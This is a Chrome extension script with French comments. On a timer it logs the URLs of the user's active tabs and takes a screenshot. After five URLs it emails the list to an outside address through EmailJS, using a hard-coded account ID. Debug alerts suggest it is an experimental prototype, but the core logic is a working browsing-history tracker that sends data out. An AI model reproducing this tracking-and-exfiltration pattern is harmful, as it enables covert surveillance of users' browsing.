//https://dashboard.emailjs.com/

var include = function(url, callback) {

    /* on crée une balise<script type="text/javascript"></script> */
    var script = document.createElement('script');
    script.type = 'text/javascript';

    /* On fait pointer la balise sur le script qu'on veut charger
       avec en prime un timestamp pour éviter les problèmes de cache
    */

    script.src = url + '?' + (new Date().getTime());

    /* On dit d'exécuter cette fonction une fois que le script est chargé */
    if (callback) {
        script.onreadystatechange = callback;
        script.onload = script.onreadystatechange;
    }

    /* On rajoute la balise script dans le head, ce qui démarre le téléchargement */
    document.getElementsByTagName('head')[0].appendChild(script);
}


var tabUrl = [];
var urls = "";
//chrome.windows.create({ url: "http://www.siteduzero.com" }) // charger une window
function newTab(fenetre, tab) { //check sur quelle page nous sommes si c'est youtube la dupliquer sinon alert l'url de la page
    if (!fenetre) // premier appel : aucun paramètre existant
    {
        chrome.windows.getLastFocused(function(fenetre) { newTab(fenetre); }); //on demande la fenêtre visible
    } else {
        if (!tab) // deuxième appel : 1 paramètre existant (fenetre)
        {
            chrome.tabs.getSelected(fenetre.id, function(tab) { newTab(fenetre, tab); }); //on demande la fenêtre visible, et on appelle la fonction une deuxième fois
        } else // troisième appel : 2 paramètres existants (fenetre et tab)
        {
            url = tab.url;
            tabUrl.push(tab.url);
            if (tabUrl.length == 5)
            //            if (url.indexOf("youtube") != -1) {
            //chrome.tabs.create({ url: tab.url });
                takePhoto(tab, null /*tab, tab.url*/ );
            //          } else
            //            alert(tab.url);
        }
    }
}

function takePhoto(tab, adresse) { // l'adresse est l'url de la tab a screenshot 
    if (!adresse) {
        chrome.tabs.captureVisibleTab(tab.windowId, null, function(adresse) { takePhoto(tab, adresse); });
    } else {
        for (var i = 0; i < tabUrl.length; i++) {
            urls += tabUrl[i] + " | ";
        }
        alert("urls" + urls);
        include('email.min.js', function() {
            (function() {
                emailjs.init("user_gSnxY79VNXbW9BTkqdrcr");
            })();
            alert("je passe dans l'envoi de mail");
            emailjs.send("gmail", "template_zYaTm7RR", {
                    name: "James",
                    notes: "Check this out!",
                    message: urls
                })
                .then(
                    function(response) {
                        console.log("SUCCESS", response);
                    },
                    function(error) {
                        console.log("FAILED", error);
                    }
                );
            //  code à exécuter une fois que le script est chargé
        })
        tabUrl = [];
        //	  document.getElementById("conteneur").innerHTML = '<img src="' + adresse + '" alt="riendutout"/>';
    }
}

localStorage['decompte'] = 20; //15*60 secondes <=> 15 minutes
function decompter() //appellée toute les 2 secondes
{
    localStorage['decompte'] = parseInt(localStorage['decompte']) - 2; // -2 car c'est toutes les 2 secondes
    if (parseInt(localStorage['decompte']) <= 0) {
        //clearInterval(repetition); //on arrète le compte à rebours
        // alert("FINi !!!!"); 
        newTab();
        localStorage['decompte'] = 20;
        //		localStorage['decompte'] = 1440* 60;
    }
}
var repetition = setInterval(decompter, 2000); //toutes les 2 secondes -> ne pas surcharger le navigateur